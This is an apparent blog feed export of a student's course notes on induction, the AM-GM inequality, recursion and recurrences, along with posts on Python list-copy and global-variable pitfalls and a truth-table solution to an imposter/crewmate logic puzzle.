Induction</h2><p>This is a version in which the inductive hypothesis is stronger. Rather than using the fact that P(k) holds for a single value, we use all values up to k.</p><script type="math/tex; mode=display">If \\[B] \quad P(m)\\[I] \quad [P(m) âˆ§ P(m+1) âˆ§ ... âˆ§ P(k)] â†’ P(k +1) \text{ for all } k â‰¥ m\\then \\[C] \quad P(n), \text{ for all } n â‰¥ m</script><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h3><p><strong>Claim</strong>: All integers â‰¥ 2 can be written as a product of primes.</p><p><strong>[B]</strong> 2 is a product of primes</p><p><strong>[I]</strong> If all $x$ with $2 â‰¤ x â‰¤ k$ can be written as a product of primes, then $k +1$ can be written as a product of primes, for all $k â‰¥ 2$</p><p>Proof for [I]?</p><p>Proof:</p><p>Case 1: $k+1$ is prime.</p><p>If k +1 is a prime number, then it is already a product of primes</p><p>(since a prime number can be considered a product of itself).</p><p>Case 2: $k + 1$ is composite.</p><p>If $k +1$ is composite, then it can be written as a product of smaller integers. Assume $k + 1 = a Ã—b$, where $2 â‰¤ a, b &lt; k +1$. By the inductive hypothesis, since a and b are less than $k + 1$ and greater than or equal to 2, they can each be written as a product of primes. Thus, $k +1$ can also be written as a product of primes.</p><h2 id="Negative-Integers-Backward-Induction"><a href="#Negative-Integers-Backward-Induction" class="headerlink" title="Negative Integers, Backward Induction"></a>Negative Integers, Backward Induction</h2><p>Take Notice</p><p>Induction can be conducted over any subset of $\mathbb{Z}$ with least element. Thus m can be negative; eg. base case $m = -10^6$</p><p>One can apply induction in the â€˜oppositeâ€™ direction $p(m) â†’ p(mâˆ’1)$. It means considering the integers with the opposite ordering where the next number after $n$ is $n âˆ’ 1$. Such induction would be used to prove some $p(n)$ for all $n â‰¤ m$.</p><p>Sometimes one needs to reason about all integers $\mathbb{Z}$. This requires two separate simple induction proofs: one for $\mathbb{N}$, another for $-\mathbb{N}$. They both would start form some initial values, which could be the same, e.g. zero. Then the first proof would proceed through positive integers; the second proof through negative integers.</p><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>To prove $P(n)$ for all $n â‰¥ k_0$</p><ul><li>verify $P(k_0)$</li><li>prove $P(k_i)$ for infinitely many $k_0 &lt; k_1 &lt; k_2 &lt; k_3 &lt; â€¦$</li><li>fill the gaps</li></ul><script type="math/tex; mode=display">P(k_1) â†’ P(k_1 âˆ’1) â†’ P(k_1 âˆ’2) â†’ ... â†’ P(k_0 +1)\\P(k_2) â†’ P(k_2 âˆ’1) â†’ P(k_2 âˆ’2) â†’ ... â†’ P(k_1 +1)</script><p>Take Notice</p><p>This form of induction is extremely important for the analysis of algorithms.</p><h3 id="Example-AM-GM-Inequality"><a href="#Example-AM-GM-Inequality" class="headerlink" title="Example: AM-GM Inequality"></a>Example: AM-GM Inequality</h3><p>Theorem. For all $n â‰¥ 1$,</p><script type="math/tex; mode=display">\frac{a_1 +a_2 +...+a_n}{n} â‰¥ (a_1 Ã—a_2 Ã—...Ã—a_n)^{\frac{1}{n}}</script><script type="math/tex; mode=display">[B] \quad P(2) \\[Forward Induction] \quad P(k) â‡’ P(2k) \\[Backward Induction] P(k) â‡’ P(k âˆ’1)</script><p>Base Case P(2)</p><p>The AM-GM inequality for two numbers is $\frac{a_1+a_2}{2} â‰¥ (a_1 a_2)^{\frac{1}{2}}$</p><p>This is equivalent to proving $(\frac{a_1+a_2}{2})^2 â‰¥ (a_1 a_2)$</p><p>Expanding the left-hand side:</p><script type="math/tex; mode=display">(\frac{a_1+a_2}{2})^2 = \frac{a_1^2 + 2a_1a_2 + a_2^2}{4}</script><p>Thus, we need to show</p><script type="math/tex; mode=display">\frac{a_1^2 + 2a_1a_2 + a_2^2}{4} â‰¥ a_1a_2</script><p>Multiplying both sides by 4, we get $a_1^2 + 2a_1a_2 + a_2^2 â‰¥ 4a_1a_2$, which simplifies to</p><script type="math/tex; mode=display">(a_1 âˆ’ a_2)^2 â‰¥ 0</script><p>which is always true. Therefore, the base case holds.</p><p><strong>Forward Induction</strong> $P(k) â‡’ P(2k)$</p><p>Assume that the inequality holds for some n = k, i.e., for any non-negative real numbers $a_1,a_2,Â·Â·Â· ,a_k$ , we have:</p><script type="math/tex; mode=display">\frac{a_1 +a_2 +...+a_k}{k} â‰¥ (a_1 Ã—a_2 Ã—...Ã—a_k)^{\frac{1}{k}}</script><p>We now need to prove that the inequality holds for 2k numbers:</p><script type="math/tex; mode=display">\frac{a_1 +a_2 +...+a_{2k}}{2k} â‰¥ (a_1 Ã—a_2 Ã—...Ã—a_{2k})^{\frac{1}{2k}}</script><p>Proof:</p><p>Divide the 2k numbers into two groups of k numbers each:</p><script type="math/tex; mode=display">G1 =\{a_1,a_2,Â·Â·Â· ,a_k\}, G2 = \{a_{k+1},a_{k+2},Â·Â·Â· ,a_{2k}\}</script><p>By the inductive hypothesis P(k), the AM-GM inequality holds for each group:</p><script type="math/tex; mode=display">\frac{a_1 +a_2 +...+a_k}{k} â‰¥ (a_1 Ã—a_2 Ã—...Ã—a_k)^{\frac{1}{k}}</script><script type="math/tex; mode=display">\frac{a_{k+1} +a_{k+2} +...+a_{2k}}{k} â‰¥ (a_{k+1} Ã—a_{k+2} Ã—...Ã—a_{2k})^{\frac{1}{k}}</script><p>Add these two inequalities:</p><script type="math/tex; mode=display">\frac{a_1 +a_2 +...+a_{2k}}{k} â‰¥ (a_1 Ã—a_2 Ã—...Ã—a_{k})^{\frac{1}{k}} + (a_{k+1} Ã—a_{k+2} Ã—...Ã—a_{2k})^{\frac{1}{k}}</script><p>Multiply both sides by $\frac{1}{2}$</p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-05-05.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-05-23.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-05-42.png" alt></p><h1 id="Structural-Induction"><a href="#Structural-Induction" class="headerlink" title="Structural Induction"></a>Structural Induction</h1><p>Basic induction allows us to assert properties over <strong>all natural numbers</strong>. The induction scheme (layout) uses the recursive definition of $\mathbb{N}$.</p><p>The induction scheme can be applied not only to natural numbers (and integers) but to any partially ordered set in general especially those defined recursively.</p><p>The basic approach is always the same â€” we need to verify that</p><ul><li><p><strong>[B]</strong> the property holds for all minimal objects â€” objects that<br>have no predecessors; they are usually very simple objects<br>allowing immediate verification</p></li><li><p><strong>[I]</strong> for any given object, if the property in question holds for<br>all its predecessors (â€˜smallerâ€™ objects) then it holds for the<br>object itself</p></li></ul><h2 id="Example-Induction-on-Î£-âˆ—"><a href="#Example-Induction-on-Î£-âˆ—" class="headerlink" title="Example: Induction on $Î£^âˆ—$"></a>Example: Induction on $Î£^âˆ—$</h2><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-08-51.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-09-36.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-10-13.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-10-43.png" alt></p><h2 id="Example-2-Induction-on-Î£-âˆ—"><a href="#Example-2-Induction-on-Î£-âˆ—" class="headerlink" title="Example 2: Induction on $Î£^âˆ—$"></a>Example 2: Induction on $Î£^âˆ—$</h2><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-11-16.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-11-34.png" alt></p><h2 id="Example-3-Induction-on-Î£-âˆ—"><a href="#Example-3-Induction-on-Î£-âˆ—" class="headerlink" title="Example 3: Induction on $Î£^âˆ—$"></a>Example 3: Induction on $Î£^âˆ—$</h2><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-12-04.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-12-25.png" alt></p><h2 id="Example-4-Induction-on-more-complex-structures"><a href="#Example-4-Induction-on-more-complex-structures" class="headerlink" title="Example 4: Induction on more complex structures"></a>Example 4: Induction on more complex structures</h2><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-12-51.png" alt></p><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-13-11.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python wrong cases</title>
      <link href="/2024/10/26/Python/python-wrong-cases/"/>
      <url>/2024/10/26/Python/python-wrong-cases/</url>
      
        <content type="html"><![CDATA[<p>This article would be updating for long long term, which is used to record every details of my programming career. Maybe you also often make a wrong programe which is non-compliant. I hope this article could help you and me to develop good programming habits, so that we can program rapidly, reasonably and correctly.</p><ul><li><a href="#list-direct-assignment-listcopy-and">list direct assignment, list.copy() and</a><ul><li><a href="#a-reference-to-the-original-list-with-always-the-same-changes">a reference to the original list with always the same changes</a></li><li><a href="#shallow-copy">Shallow Copy</a></li><li><a href="#deep-copy">deep copy</a></li><li><a href="#conclusion">conclusion</a></li></ul></li><li><a href="#improper-global-variables-use-and-forget-reseting-the-global-flag-after-finished">improper global variables use and forget reseting the global flag after finished</a></li></ul><h1 id="list-direct-assignment-list-copy-and"><a href="#list-direct-assignment-list-copy-and" class="headerlink" title="list direct assignment, list.copy() and"></a>list direct assignment, list.copy() and</h1><p>what is the differences of <code>tmp = list_a</code>, <code>tmp = list_a.copy()</code> and <code>tmp = copy.deepcopy(list_a)</code></p><h2 id="a-reference-to-the-original-list-with-always-the-same-changes"><a href="#a-reference-to-the-original-list-with-always-the-same-changes" class="headerlink" title="a reference to the original list with always the same changes"></a>a reference to the original list with always the same changes</h2><p>tmp = list_a (Assignment):</p><ul><li>This creates a reference to the original list, list_a.</li><li>Any changes made to tmp will directly affect list_a because they both point to the same memory location.</li><li>This is known as a shallow reference.</li></ul><h2 id="Shallow-Copy"><a href="#Shallow-Copy" class="headerlink" title="Shallow Copy"></a>Shallow Copy</h2><ul><li>This creates a new list with a shallow copy of list_aâ€™s elements.</li><li>The new list, tmp, is separate from list_a, so modifying tmp wonâ€™t affect list_a (and vice versa) if they contain only simple data types (like integers or strings).</li><li>However, if list_a contains <strong>mutable elements</strong> (<strong>like other lists or dictionaries</strong>), tmp will still reference those same nested objects. Therefore, modifying these nested elements in tmp will also affect list_a.</li></ul><p>Take notice, mutable elements are the same such as a sublist as its element: [5,6,7] and [9,10]. The object in the list would have the same changes if you changed the new copy or original list.</p><p>But the single simple element are seperately, you change 1 to 2, they wonâ€™t impact mutually.</p><pre><code class="lang-python"># [5,6,7] and [9,10] are mutable elementsa = [1,2,3,4, [5,6,7], 8, [9,10]]b = a.copy()print(&quot;a: &quot;, a)print(&quot;b: &quot;, b)# won&#39;t change the originalb[0] = 11print(&quot;a: &quot;, a)print(&quot;b: &quot;, b)# Will change the originalb[4][0] = 12print(&quot;a: &quot;, a)print(&quot;b: &quot;, b)</code></pre><pre><code class="lang-output">a:  [1, 2, 3, 4, [5, 6, 7], 8, [9, 10]]b:  [1, 2, 3, 4, [5, 6, 7], 8, [9, 10]]a:  [1, 2, 3, 4, [5, 6, 7], 8, [9, 10]]b:  [11, 2, 3, 4, [5, 6, 7], 8, [9, 10]]a:  [1, 2, 3, 4, [12, 6, 7], 8, [9, 10]]b:  [11, 2, 3, 4, [12, 6, 7], 8, [9, 10]]</code></pre><h2 id="deep-copy"><a href="#deep-copy" class="headerlink" title="deep copy"></a>deep copy</h2><p><code>tmp = copy.deepcopy(list_a)</code> (<strong>Deep Copy</strong>):</p><p>This creates a completely independent copy of list_a, including all nested objects.<br>Any changes made to tmp or its nested elements wonâ€™t affect list_a, and vice versa.<br>This approach is useful when working with complex, nested structures where you want a fully independent duplicate of the original list.</p><h2 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h2><ul><li>Assignment (tmp = list_a): tmp and list_a are <strong>the same object</strong>.</li><li>Shallow Copy (tmp = list_a.copy()): tmp is a new list, but it <strong>shares nested objects with list_a</strong>.</li><li>Deep Copy (tmp = copy.deepcopy(list_a)): tmp is a <strong>completely independent</strong> copy, including all nested objects.</li></ul><h1 id="improper-global-variables-use-and-forget-reseting-the-global-flag-after-finished"><a href="#improper-global-variables-use-and-forget-reseting-the-global-flag-after-finished" class="headerlink" title="improper global variables use and forget reseting the global flag after finished"></a>improper global variables use and forget reseting the global flag after finished</h1><p>During 20th, 21st Oct 2024, I was doing Martinâ€™s large assignment 1. In the solitaire case, I wrongly used the <code>ROUND_FLAG=1</code> to be a flag to record the rounds of the game. Hence, when I singly run the program, then it would generate correct result; but if I called simulate() for many times, it would generate wrong results. For example, I put 7 as the random seed, then it would generate correct result; when I give 7 also to simulate(), I debugged and saw 7 into the seed variable, but it would generate wrong result.</p><p>Then I found the global variable mattered. T_T . I shouldnâ€™t use global variable, because itâ€™s not worthy to use global variable, and then, I should reset it after every round.</p><p><img src="/2024/10/26/Python/python-wrong-cases/2024-10-26-07-01-11.png" alt></p><p><img src="/2024/10/26/Python/python-wrong-cases/2024-10-26-07-04-09.png" alt></p><p>It is a good thought that reset every global variable after running the functions, if you want to call your function with the global variables, in one script to call for many times at once.</p>]]></content>
      
      
      <categories>
          
          <category> Py </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>truth table solves imposter and crewmate</title>
      <link href="/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/"/>
      <url>/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#question">question</a></li><li><a href="#solutions">solutions</a><ul><li><a href="#lectures-slides">lectureâ€™s slides</a></li><li><a href="#full-traversal-assignments">full traversal assignments</a></li><li><a href="#truth-table">truth table</a></li><li><a href="#varun-agarwal">Varun Agarwal</a></li></ul></li><li><a href="#conclusion">conclusion</a></li><li><a href="#total-ed-picture">Total ED picture</a></li></ul><p>25/10/2024, after the lecture of Math(COMP 9020), I asked lecturor Jiaojiao that if the imposter and crewmate on slides are wrong.</p><p>I incorrectly thought only one imposter, and two honest crewmates!</p><pre><code>Green: â€œRed and Blue are both crewmatesâ€It&#39;s an unsatisfible contradiction to the question, we cannot gain conclusions that Green is crewmate or imposter.In the lecture and the conclusion in slides, it wrongly demands one imposter and two crewmates.If Green is imposter, then he told a truth, which is contradiction with the question;if Green is crewmate, then he told a truth, then 3 people are all crewmates.</code></pre><h1 id="question"><a href="#question" class="headerlink" title="question"></a>question</h1><p>Premises: Every one is either a crewmate,or an imposter, but not both.</p><ul><li>Red: â€œBlue is an imposterâ€</li><li>Green: â€œRed and Blue are both crewmatesâ€</li><li>Blue: â€œRed is a crewmate, or Green is an imposterâ€</li></ul><hr><p>Conclusion: Greenisanimposter</p><hr><h1 id="solutions"><a href="#solutions" class="headerlink" title="solutions"></a>solutions</h1><h2 id="lectureâ€™s-slides"><a href="#lectureâ€™s-slides" class="headerlink" title="lectureâ€™s slides"></a>lectureâ€™s slides</h2><p>Translation to logic: Let R, G, B represent â€œRed (Green, Blue) is a crewmateâ€.</p><script type="math/tex; mode=display">Ï†_1 =R â†”Â¬B \\Ï†_2 =G â†”(Râˆ§B) \\Ï†_3 =B â†”(Râˆ¨Â¬G) \\Conclusion: Ïˆ = Â¬G</script><h2 id="full-traversal-assignments"><a href="#full-traversal-assignments" class="headerlink" title="full traversal assignments"></a>full traversal assignments</h2><p>I draw the table firstly, which contains full traversal assignments and truth table. They are two different solutions.</p><p><img src="/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/tt_1.png" alt></p><p><img src="/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/tt_2.png" alt></p><h2 id="truth-table"><a href="#truth-table" class="headerlink" title="truth table"></a>truth table</h2><p><img src="/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/tt_3.png" alt></p><h2 id="Varun-Agarwal"><a href="#Varun-Agarwal" class="headerlink" title="Varun Agarwal"></a>Varun Agarwal</h2><p>refer to the picture â€¦</p><h1 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h1><p>R and G are imposters, B is crewmate. Totally two imposters and one crewmate.</p><h1 id="Total-ED-picture"><a href="#Total-ED-picture" class="headerlink" title="Total ED picture"></a>Total ED picture</h1><p><img src="/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/tt_t.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>unwind recursion formula</title>
      <link href="/2024/10/24/Math/unwind-recursion-formula/"/>
      <url>/2024/10/24/Math/unwind-recursion-formula/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/24/Math/unwind-recursion-formula/unwind.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>improper atomic and entailment</title>
      <link href="/2024/10/24/Math/improper-atomic-and-entailment/"/>
      <url>/2024/10/24/Math/improper-atomic-and-entailment/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/24/Math/improper-atomic-and-entailment/AE.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Recursion</title>
      <link href="/2024/10/24/Math/Recursion/"/>
      <url>/2024/10/24/Math/Recursion/</url>
      
        <content type="html"><![CDATA[<p>Lecture 11: Recursion</p><ul><li><a href="#introduction-recursion-in-computer-science">Introduction: Recursion in Computer Science</a></li><li><a href="#recursion">Recursion</a><ul><li><a href="#example-factorial">Example: Factorial</a></li><li><a href="#example-euclids-gcd-algorithm">Example: Euclidâ€™s gcd algorithm</a></li><li><a href="#example-towers-of-hanoi">Example: Towers of Hanoi</a><ul><li><a href="#move-1-disks">move 1 disks</a></li><li><a href="#move-2-disks">move 2 disks</a></li><li><a href="#move-3-disks">move 3 disks</a></li><li><a href="#move-4-disks">move 4 disks</a></li></ul></li></ul></li><li><a href="#recursive-data-structures">Recursive Data Structures</a><ul><li><a href="#example-natural-numbers">Example: Natural numbers</a></li><li><a href="#example-oddeven-numbers">Example: Odd/Even numbers</a></li><li><a href="#example-fibonacci-numbers">Example: Fibonacci numbers</a></li><li><a href="#example-linked-lists">Example: Linked lists</a></li><li><a href="#example-words-over-Ïƒ">Example: Words over $Î£$</a></li><li><a href="#example-expressions-in-the-proof-assistant">Example: Expressions in the Proof Assistant</a></li><li><a href="#example-propositional-formulas">Example: Propositional formulas</a></li><li><a href="#exercises">Exercises</a></li></ul></li><li><a href="#recursive-programming">Recursive Programming</a><ul><li><a href="#programming-over-recursive-datatypes">Programming over recursive datatypes</a></li><li><a href="#exercise">Exercise</a></li><li><a href="#pitfall-correctness-of-recursive-definition">Pitfall: Correctness of Recursive Definition</a><ul><li><a href="#example-incorrect-definition">Example (Incorrect definition)</a></li><li><a href="#example-incorrect-definition-1">Example (Incorrect definition)</a></li></ul></li><li><a href="#mutual-recursion">Mutual Recursion</a><ul><li><a href="#example-fibonacci-again">Example (Fibonacci, again)</a></li></ul></li></ul></li><li><a href="#solving-recurrences">Solving Recurrences</a><ul><li><a href="#example-1-unwinding">Example 1 (Unwinding)</a></li><li><a href="#example-2-unwinding">Example 2 (unwinding)</a></li><li><a href="#example-3-approximating-with-big-o">Example 3 (Approximating with big-O)</a></li><li><a href="#master-theorem">Master Theorem</a><ul><li><a href="#example-1">Example 1</a></li><li><a href="#example-2">Example 2</a></li><li><a href="#example-3-wind">Example 3 wind</a></li></ul></li><li><a href="#the-master-theorem-pitfalls">The Master Theorem: Pitfalls</a></li><li><a href="#the-master-theorem-linear-differences">The Master Theorem: Linear differences</a><ul><li><a href="#exercise-1">exercise</a></li></ul></li></ul></li></ul><h1 id="Introduction-Recursion-in-Computer-Science"><a href="#Introduction-Recursion-in-Computer-Science" class="headerlink" title="Introduction: Recursion in Computer Science"></a>Introduction: Recursion in Computer Science</h1><p>Fundamental concept in Computer Science</p><ul><li>Defining complex objects from simpler ones</li><li>Unbounded complexity with a finite description</li></ul><p>Recursive Data Structures:</p><p>Finite definitions of <strong>arbitrarily large</strong> objects</p><ul><li>Natural numbers</li><li>Words</li><li>Linked lists</li><li>Formulas</li><li>Binary trees</li></ul><p>Recursive Algorithms:</p><p>Solving problems/calculations by reducing to smaller cases</p><ul><li>Factorial</li><li>Euclidean gcd algorithm</li><li>Towers of Hanoi</li><li>Mergesort, Quicksort</li></ul><p>Analysis of Recursion:</p><p>Reasoning about recursive objects</p><ul><li>Induction, Structural Induction</li><li>Recursive sequences (e.g. Fibonacci sequence)</li><li>Asymptotic analysis of recursive functions</li></ul><h1 id="Recursion"><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h1><p>Consists of a basis <strong>(B)</strong> and recursive process <strong>(R)</strong>.</p><p>A sequence/object/algorithm is recursively defined when (typically)</p><p><strong>(B)</strong> some initial terms are specified, perhaps only the first one;</p><p><strong>(R)</strong> later terms stated as functional expressions of the earlier<br>terms.</p><p>Take Notice</p><p>(R) also called <strong>recurrence formula (especially when dealing with sequences)</strong></p><h2 id="Example-Factorial"><a href="#Example-Factorial" class="headerlink" title="Example: Factorial"></a>Example: Factorial</h2><p>$Factorial$:</p><p>(B) $0! =1$</p><p>(R) $(n+1)! = (n+1)Â·n!$</p><p>$fact(n)$:</p><p>(B) $if(n = 0): 1$</p><p>(R) $else: n âˆ— fact(n âˆ’1)$</p><p>TAKE NOTICE: $0! =1$</p><h2 id="Example-Euclidâ€™s-gcd-algorithm"><a href="#Example-Euclidâ€™s-gcd-algorithm" class="headerlink" title="Example: Euclidâ€™s gcd algorithm"></a>Example: Euclidâ€™s gcd algorithm</h2><script type="math/tex; mode=display">gcd(m,n)\begin{cases}    m & \text{if m = n} \\    gcd(m âˆ’n,n) & \text{if m >n} \\    gcd(m,nâˆ’m) & \text{if m <n}\end{cases}</script><h2 id="Example-Towers-of-Hanoi"><a href="#Example-Towers-of-Hanoi" class="headerlink" title="Example: Towers of Hanoi"></a>Example: Towers of Hanoi</h2><ul><li>There are 3 towers (pegs)</li><li>n disks of decreasing size placed on the first tower</li><li>You need to move all disks from the first tower to the last tower</li><li>Larger disks cannot be placed on top of smaller disks</li><li>The third tower can be used to temporarily hold disks</li></ul><p>Questions:</p><ul><li>Describe a general solution for n disks</li><li>How many moves does it take?</li></ul><h3 id="move-1-disks"><a href="#move-1-disks" class="headerlink" title="move 1 disks"></a>move 1 disks</h3><p><strong>One step</strong> obviously.</p><h3 id="move-2-disks"><a href="#move-2-disks" class="headerlink" title="move 2 disks"></a>move 2 disks</h3><p><strong>Three steps</strong> obviously.</p><h3 id="move-3-disks"><a href="#move-3-disks" class="headerlink" title="move 3 disks"></a>move 3 disks</h3><p><img src="/2024/10/24/Math/Recursion/Honai_tower.png" alt></p><p>We move 3 towers that takes <strong>7 steps</strong>. â€”-(1)</p><h3 id="move-4-disks"><a href="#move-4-disks" class="headerlink" title="move 4 disks"></a>move 4 disks</h3><p>And if we need to move 4 towers, we move the top 3 towers into the middle pillar ((1) move to the second pillar rather not third one, but takes the same steps), <strong>7 steps</strong></p><p>then take <strong>1 step</strong> to move the biggest disk to the third pillar â€”- (2)</p><p>then take 7 steps to the third pillar â€”- (3)</p><p>hence 4 disks take $7+1+7=15$ steps.</p><div class="table-container"><table><thead><tr><th style="text-align:left">disks</th><th style="text-align:left">steps</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">1</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">3</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">7</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">15</td></tr></tbody></table></div><p>Hence the recursion formula is</p><script type="math/tex; mode=display">M(n) â‰¤ 2M(nâˆ’1)+1</script><h1 id="Recursive-Data-Structures"><a href="#Recursive-Data-Structures" class="headerlink" title="Recursive Data Structures"></a>Recursive Data Structures</h1><h2 id="Example-Natural-numbers"><a href="#Example-Natural-numbers" class="headerlink" title="Example: Natural numbers"></a>Example: Natural numbers</h2><p>A natural number is either 0 <strong>(B)</strong> or one more than a natural number <strong>(R)</strong>.</p><p>Formal definition of N:</p><ul><li><strong>(B)</strong> $0 âˆˆ \mathbb{N}$</li><li><strong>(R)</strong> If $n âˆˆ \mathbb{N} \quad then (n+1) âˆˆ \mathbb{N}$</li></ul><h2 id="Example-Odd-Even-numbers"><a href="#Example-Odd-Even-numbers" class="headerlink" title="Example: Odd/Even numbers"></a>Example: Odd/Even numbers</h2><p>The set of <strong>even numbers</strong> can be defined as:</p><ul><li><strong>(B)</strong> 0 is an even number</li><li><strong>(R)</strong> If $n$ is an even number then $n+2$ is an even number</li></ul><p>The set of <strong>odd numbers</strong> can be defined as:</p><ul><li><strong>(B)</strong> 1 is an odd number</li><li><strong>(R)</strong> If $n$ is an odd number then $n+2$ is an odd number</li></ul><h2 id="Example-Fibonacci-numbers"><a href="#Example-Fibonacci-numbers" class="headerlink" title="Example: Fibonacci numbers"></a>Example: Fibonacci numbers</h2><p>The Fibonacci sequence starts 0, 1, 1, 2, 3, â€¦ where, after 0, 1, each term is the sum of the previous two terms.</p><p>Formally, the sequence of Fibonacci numbers: $F_0, F_1, F_2, \dots$ where the n-th Fibonacci number $F_n$ is defined as:</p><script type="math/tex; mode=display">(B) F_0 = 0, \\(B) F_1 = 1, \\(R) F_n = F_{nâˆ’1} +F_{nâˆ’2}</script><p>Take Notice</p><p>Could also define the Fibonacci sequence as a function</p><p>$FIB : \mathbb{N} \to \mathbb{F}.$</p><p>the $\mathbb{F}$ represents the set of Fibonacci numbers. </p><script type="math/tex; mode=display">F=\{ F_0, F_1, F_2, F_3, \dots \} = \{ 0, 1, 1, 2, 3, 5, 8, 13, \dots \}</script><h2 id="Example-Linked-lists"><a href="#Example-Linked-lists" class="headerlink" title="Example: Linked lists"></a>Example: Linked lists</h2><p>A linked list is zero or more linked list nodes:</p><p><img src="/2024/10/24/Math/Recursion/linked_list.png" alt></p><p>We can view the linked list <strong>structure</strong> abstractly. A linked list is either:</p><ul><li><strong>(B)</strong> an empty list, or</li><li><strong>(R)</strong> an ordered pair (Data,List).</li></ul><h2 id="Example-Words-over-Î£"><a href="#Example-Words-over-Î£" class="headerlink" title="Example: Words over $Î£$"></a>Example: Words over $Î£$</h2><p>A word over an alphabet $Î£$ is either $Î»(B)$ or a symbol from $Î£$ followed by a word (R).</p><p>Formal definition of $Î£^âˆ—$:</p><ul><li>$(B) Î» âˆˆ Î£^âˆ—$</li><li>$(R) \text{If } w âˆˆ Î£^âˆ— \text{then } aw âˆˆ Î£^âˆ— \text{ for all } a âˆˆ Î£$</li></ul><p>Take Notice</p><p>This matches the recursive definition of a <strong>Linked List</strong> data type.</p><h2 id="Example-Expressions-in-the-Proof-Assistant"><a href="#Example-Expressions-in-the-Proof-Assistant" class="headerlink" title="Example: Expressions in the Proof Assistant"></a>Example: Expressions in the Proof Assistant</h2><p>(B) $A,B,â€¦,Z,a,b,â€¦z$ are expressions \<br>(B) $âˆ…$ and $U$ are expressions \<br>(R) If $E$ is an expression then so is $(E)$ and $E^c$ \<br>(R) If $E_1$ and $E_2$ are expressions then:</p><script type="math/tex; mode=display">(E_1 âˆª E_2), \\(E_1 âˆ© E_2), \\(E_1 \backslash E_2), and \\(E_1 âŠ• E_2) \text{ are expressions}.</script><h2 id="Example-Propositional-formulas"><a href="#Example-Propositional-formulas" class="headerlink" title="Example: Propositional formulas"></a>Example: Propositional formulas</h2><p>A well-formed formula (wff) over a set of propositional variables, $Prop$ is defined as:</p><p>(B) $âŠ¤$ is a wff</p><p>(B) $âŠ¥$ is a wff</p><p>(B) $p$ is a wff for all $p âˆˆ Prop$</p><p>(R) If $Ï†$ is a wff then $Â¬Ï†$ is a wff</p><p>(R) If $Ï†$ and $Ïˆ$ are wffs then:</p><ul><li>$(Ï† âˆ§Ïˆ)$,</li><li>$(Ï† âˆ¨Ïˆ)$,</li><li>$(Ï† â†’Ïˆ)$, and</li><li>$(Ï† â†”Ïˆ)$ are wffs.</li></ul><h2 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h2><p>(a) Give a recursive definition for the sequence</p><script type="math/tex; mode=display">(2, 4, 16, 256, ...)</script><p>To generate $a<em>n = 2^{2^n}$ use $a_n = (a</em>{nâˆ’1})^2$.</p><p>(The related â€œFermat numbersâ€ $F_n = 2^{2^n} + 1$ are used in cryptography.)</p><p>(b) Give a recursive definition for the sequence</p><script type="math/tex; mode=display">(2, 4, 16, 65536, ...)</script><p>To generate a â€œstackâ€ of n 2â€™s use $b<em>n = 2^{b</em>{nâˆ’1}}$.</p><h1 id="Recursive-Programming"><a href="#Recursive-Programming" class="headerlink" title="Recursive Programming"></a>Recursive Programming</h1><h2 id="Programming-over-recursive-datatypes"><a href="#Programming-over-recursive-datatypes" class="headerlink" title="Programming over recursive datatypes"></a>Programming over recursive datatypes</h2><p>Recursive datatypes make recursive programming/functions easy.</p><p>The factorial function:</p><script type="math/tex; mode=display">fact(n): \\(B) \quad if(n = 0): 1 \\(R) \quad else: n âˆ— fact(n âˆ’1)</script><p>Summing the first n natural numbers:</p><script type="math/tex; mode=display">sum(n): \\(B) \quad if(n = 0): 0 \\(R) \quad else: n +sum(n âˆ’1)</script><p>Summing elements of a linked list:</p><script type="math/tex; mode=display">sum(L): \\(B) if(L.isEmpty()): return 0 \\(R) else: return L.data+sum(L.next)</script><p>Sorting elements of a linked list (insertion sort):</p><script type="math/tex; mode=display">sort(L):(B) if(L.isEmpty()): \\return L \\else: \\ (R) L2 =sort(L.next) \\insert L.data into L2 \\return L2</script><p>Concatenation of words (defining wv):</p><p>For all $w,v âˆˆ Î£^âˆ—$ and $a âˆˆ Î£$ :</p><p>(B) $Î»v =v$</p><p>(R) $(aw)v = 